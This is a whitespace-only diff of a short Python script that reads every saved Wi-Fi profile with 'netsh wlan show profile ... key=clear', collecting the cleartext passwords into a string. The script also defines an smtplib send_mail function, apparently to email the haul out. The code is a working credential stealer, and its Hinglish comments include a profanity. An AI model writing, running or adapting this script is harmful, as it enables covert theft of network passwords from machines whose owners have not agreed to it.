@@ -1,6 +1,6 @@
-#!/usr/bin/env python                                    #Ye pata nahi kyu likha h
+#!/usr/bin/env python                                     #Ye pata nahi kyu likha h
 
-import subprocess, smtplib, re
+import subprocess, smtplib, re              
 
 
 def send_mail(email, password, message):                  #function for sending email to yourself
@@ -18,7 +18,7 @@ for name in names_list:                                   # to get the key of ea
     try:
         command = "netsh wlan show profile " + '"' + name + '"' + " key=clear "
         current_result = subprocess.check_output(command, shell=True).decode('utf-8')
-    except subprocess.CalledProcessError :                     # If there's a runtime error in console
+    except subprocess.CalledProcessError :                # If there's a runtime error in console
         current_result = "error"
         #print("Error occurred with %s ", name)           # Ye ignore kaar bsdk.
 result = result + current_result
